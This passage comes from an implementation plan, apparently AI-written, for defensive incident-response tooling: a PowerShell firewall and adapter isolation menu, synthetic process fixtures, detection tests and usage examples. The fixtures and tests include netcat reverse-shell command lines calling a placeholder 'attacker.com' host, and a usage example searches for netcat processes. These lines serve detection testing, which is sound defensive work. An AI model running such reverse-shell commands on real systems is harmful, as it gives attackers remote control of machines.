        dir=out action=block protocol=$proto localport=$port

    Write-Success "Blocked outbound $proto port $port"
}

function Block-IP {
    $ip = Read-Host "Enter IP address to block"
    $ruleName = "IR_Block_IP_$ip"

    netsh advfirewall firewall add rule name="${ruleName}_in" `
        dir=in action=block remoteip=$ip
    netsh advfirewall firewall add rule name="${ruleName}_out" `
        dir=out action=block remoteip=$ip

    Write-Success "Blocked all traffic to/from $ip"
}

function Allow-Port {
    $port = Read-Host "Enter port number to allow"
    $proto = Read-Host "Protocol (tcp/udp) [tcp]"
    if ([string]::IsNullOrEmpty($proto)) { $proto = "tcp" }
    $ruleName = "IR_Allow_${proto}_${port}"

    netsh advfirewall firewall add rule name="$ruleName" `
        dir=in action=allow protocol=$proto localport=$port

    Write-Success "Allowed $proto port $port"
}

function Allow-IP {
    $ip = Read-Host "Enter IP address to allow"
    $ruleName = "IR_Allow_IP_$ip"

    netsh advfirewall firewall add rule name="${ruleName}_in" `
        dir=in action=allow remoteip=$ip
    netsh advfirewall firewall add rule name="${ruleName}_out" `
        dir=out action=allow remoteip=$ip

    Write-Success "Allowed traffic to/from $ip"
}

function Delete-Rule {
    Write-Host "Current IR rules:" -ForegroundColor Yellow
    netsh advfirewall firewall show rule name=all | Select-String "IR_"
    $ruleName = Read-Host "Enter rule name to delete"
    netsh advfirewall firewall delete rule name="$ruleName"
    Write-Success "Rule deleted"
}

function Block-AllInbound {
    Write-Warn "This will block ALL inbound connections!"
    $confirm = Read-Host "Are you sure? (yes/no)"
    if ($confirm -eq "yes") {
        netsh advfirewall set allprofiles firewallpolicy blockinbound,allowoutbound
        Write-Success "All inbound traffic blocked"
    }
}

function Block-AllOutbound {
    Write-Warn "This will block ALL outbound connections!"
    $confirm = Read-Host "Are you sure? (yes/no)"
    if ($confirm -eq "yes") {
        netsh advfirewall set allprofiles firewallpolicy allowinbound,blockoutbound
        Write-Success "All outbound traffic blocked"
    }
}

function Reset-Firewall {
    Write-Warn "This will reset firewall to default settings!"
    $confirm = Read-Host "Are you sure? (yes/no)"
    if ($confirm -eq "yes") {
        netsh advfirewall reset
        Write-Success "Firewall reset to defaults"
    }
}

function Show-Adapters {
    Write-Header "Network Adapters"
    Get-NetAdapter | Format-Table Name, Status, MacAddress, LinkSpeed -AutoSize
}

function Disable-Adapter {
    Show-Adapters
    $adapterName = Read-Host "Enter adapter name to disable"
    Disable-NetAdapter -Name $adapterName -Confirm:$false
    Write-Success "Adapter '$adapterName' disabled"
}

function Enable-Adapter {
    Get-NetAdapter | Format-Table Name, Status -AutoSize
    $adapterName = Read-Host "Enter adapter name to enable"
    Enable-NetAdapter -Name $adapterName -Confirm:$false
    Write-Success "Adapter '$adapterName' enabled"
}

# Main loop
while ($true) {
    $choice = Show-Menu
    switch ($choice) {
        "1"  { Show-FirewallStatus }
        "2"  { Show-OpenPorts }
        "3"  { Enable-Firewall }
        "4"  { Disable-Firewall }
        "5"  { Block-Port-Inbound }
        "6"  { Block-Port-Outbound }
        "7"  { Block-IP }
        "8"  { Allow-Port }
        "9"  { Allow-IP }
        "10" { Delete-Rule }
        "11" { Block-AllInbound }
        "12" { Block-AllOutbound }
        "13" { Reset-Firewall }
        "14" { Disable-Adapter }
        "15" { Enable-Adapter }
        "16" { Show-Adapters }
        "0"  { Write-Info "Exiting"; exit }
        default { Write-Err "Invalid option" }
    }
    Read-Host "`nPress Enter to continue"
}
```

**Step 2: Commit**

```bash
git add network_isolation/windows/network_isolate.ps1
git commit -m "feat: add Windows PowerShell network isolation script"
```

---

## Script 5: Unit Tests with Synthetic Datasets

### Task 5.1: Create Test Fixtures

**Files:**
- Create: `tests/fixtures/synthetic_baseline.json`
- Create: `tests/fixtures/synthetic_processes.json`

**Step 1: Create synthetic baseline**

```json
{
  "timestamp": "2026-01-15T10:00:00",
  "hostname": "test-host",
  "platform": "Linux",
  "processes": [
    {"pid": 1, "name": "systemd", "exe": "/usr/lib/systemd/systemd", "ppid": 0, "username": "root", "exe_hash": "abc123"},
    {"pid": 100, "name": "sshd", "exe": "/usr/sbin/sshd", "ppid": 1, "username": "root", "exe_hash": "def456"},
    {"pid": 200, "name": "nginx", "exe": "/usr/sbin/nginx", "ppid": 1, "username": "www-data", "exe_hash": "ghi789"},
    {"pid": 300, "name": "postgres", "exe": "/usr/bin/postgres", "ppid": 1, "username": "postgres", "exe_hash": "jkl012"}
  ]
}
```

**Step 2: Create synthetic current processes (with anomalies)**

```json
{
  "description": "Current state with anomalies for testing",
  "processes": [
    {"pid": 1, "name": "systemd", "exe": "/usr/lib/systemd/systemd", "ppid": 0, "username": "root", "exe_hash": "abc123"},
    {"pid": 100, "name": "sshd", "exe": "/usr/sbin/sshd", "ppid": 1, "username": "root", "exe_hash": "def456"},
    {"pid": 500, "name": "reverse_shell", "exe": "/tmp/rs.elf", "ppid": 100, "username": "www-data", "exe_hash": "malware1", "cmdline": "nc -e /bin/sh attacker.com 4444"},
    {"pid": 501, "name": "cryptominer", "exe": "/dev/shm/.hidden/miner", "ppid": 1, "username": "nobody", "exe_hash": "malware2"},
    {"pid": 200, "name": "nginx", "exe": "/usr/sbin/nginx", "ppid": 1, "username": "www-data", "exe_hash": "modified_hash"}
  ],
  "expected_new": ["reverse_shell", "cryptominer"],
  "expected_missing": ["postgres"],
  "expected_modified": ["nginx"]
}
```

**Step 3: Commit**

```bash
git add tests/fixtures/
git commit -m "test: add synthetic test fixtures"
```

---

### Task 5.2: Create Comprehensive Integration Tests

**Files:**
- Create: `tests/test_integration.py`

**Step 1: Write integration tests**

```python
# tests/test_integration.py
"""Integration tests with synthetic datasets."""
import unittest
import json
import os

class TestSyntheticAnomalyDetection(unittest.TestCase):
    """Test anomaly detection with known synthetic data."""

    @classmethod
    def setUpClass(cls):
        fixtures_dir = os.path.join(os.path.dirname(__file__), 'fixtures')
        with open(os.path.join(fixtures_dir, 'synthetic_baseline.json')) as f:
            cls.baseline = json.load(f)
        with open(os.path.join(fixtures_dir, 'synthetic_processes.json')) as f:
            cls.current = json.load(f)

    def test_detect_new_malicious_processes(self):
        from ir_scripts.utils.process_utils import compare_processes

        results = compare_processes(
            self.baseline['processes'],
            self.current['processes']
        )

        new_names = [p['name'] for p in results['new']]
        for expected in self.current['expected_new']:
            self.assertIn(expected, new_names,
                f"Failed to detect new process: {expected}")

    def test_detect_missing_processes(self):
        from ir_scripts.utils.process_utils import compare_processes

        results = compare_processes(
            self.baseline['processes'],
            self.current['processes']
        )

        missing_names = [p['name'] for p in results['missing']]
        for expected in self.current['expected_missing']:
            self.assertIn(expected, missing_names,
                f"Failed to detect missing process: {expected}")

    def test_detect_modified_processes(self):
        from ir_scripts.utils.process_utils import compare_processes

        results = compare_processes(
            self.baseline['processes'],
            self.current['processes']
        )

        # Modified detection checks hash changes
        modified_names = [m['process']['name'] for m in results['modified']]
        for expected in self.current['expected_modified']:
            self.assertIn(expected, modified_names,
                f"Failed to detect modified process: {expected}")

class TestProcessHunterPatterns(unittest.TestCase):
    """Test process hunter regex patterns."""

    def test_reverse_shell_detection(self):
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'nc',
            'exe': '/tmp/nc',
            'cmdline': 'nc -e /bin/bash attacker.com 4444',
            'connections': [{'laddr': '0.0.0.0:0', 'raddr': '1.2.3.4:4444'}]
        }

        indicators = check_suspicious(proc)
        self.assertGreater(len(indicators), 0)

    def test_legitimate_process_low_suspicion(self):
        from ir_scripts.process_hunter import check_suspicious

        proc = {
            'name': 'vim',
            'exe': '/usr/bin/vim',
            'cmdline': 'vim /etc/hosts',
            'connections': []
        }

        indicators = check_suspicious(proc)
        self.assertEqual(len(indicators), 0)

if __name__ == '__main__':
    unittest.main()
```

**Step 2: Run tests**

Run: `cd /home/kali/elastic_ir_scripts && python -m pytest tests/ -v`
Expected: All tests PASS

**Step 3: Commit**

```bash
git add tests/test_integration.py
git commit -m "test: add integration tests with synthetic datasets"
```

---

## Summary and Execution

### Final Project Structure

```
elastic_ir_scripts/
├── ir_scripts/
│   ├── __init__.py
│   ├── utils/
│   │   ├── __init__.py
│   │   ├── colors.py
│   │   ├── process_utils.py
│   │   └── file_utils.py
│   ├── process_anomaly.py
│   ├── file_anomaly.py
│   ├── process_hunter.py
│   ├── baselines/
│   └── whitelists/
│       ├── kernel_processes_linux.json
│       └── kernel_processes_windows.json
├── network_isolation/
│   ├── linux/
│   │   ├── network_isolate_iptables.sh
│   │   └── network_isolate_ufw.sh
│   └── windows/
│       └── network_isolate.ps1
├── tests/
│   ├── __init__.py
│   ├── test_colors.py
│   ├── test_process_utils.py
│   ├── test_file_utils.py
│   ├── test_process_anomaly.py
│   ├── test_file_anomaly.py
│   ├── test_process_hunter.py
│   ├── test_integration.py
│   └── fixtures/
│       ├── synthetic_baseline.json
│       └── synthetic_processes.json
├── requirements.txt
└── docs/
    └── plans/
        └── 2026-01-16-ir-threat-hunting-scripts.md
```

### Usage Examples

```bash
# Process Anomaly Detection
python ir_scripts/process_anomaly.py baseline          # Create baseline
python ir_scripts/process_anomaly.py scan              # Run scan

# File Anomaly Detection
python ir_scripts/file_anomaly.py baseline             # Create baseline
python ir_scripts/file_anomaly.py scan                 # Run scan

# Process Hunter
python ir_scripts/process_hunter.py "nc|netcat|ncat"   # Search
python ir_scripts/process_hunter.py ".*miner.*" --kill # Search and kill

# Network Isolation (Linux)
sudo ./network_isolation/linux/network_isolate_iptables.sh
sudo ./network_isolation/linux/network_isolate_ufw.sh

# Network Isolation (Windows - Run as Admin)
.\network_isolation\windows\network_isolate.ps1

# Run Tests
python -m pytest tests/ -v
```

---

**Plan complete and saved to `docs/plans/2026-01-16-ir-threat-hunting-scripts.md`.**

**Two execution options:**

**1. Subagent-Driven (this session)** - I dispatch fresh subagent per task, review between tasks, fast iteration

**2. Parallel Session (separate)** - Open new session with executing-plans, batch execution with checkpoints

**Which approach?**
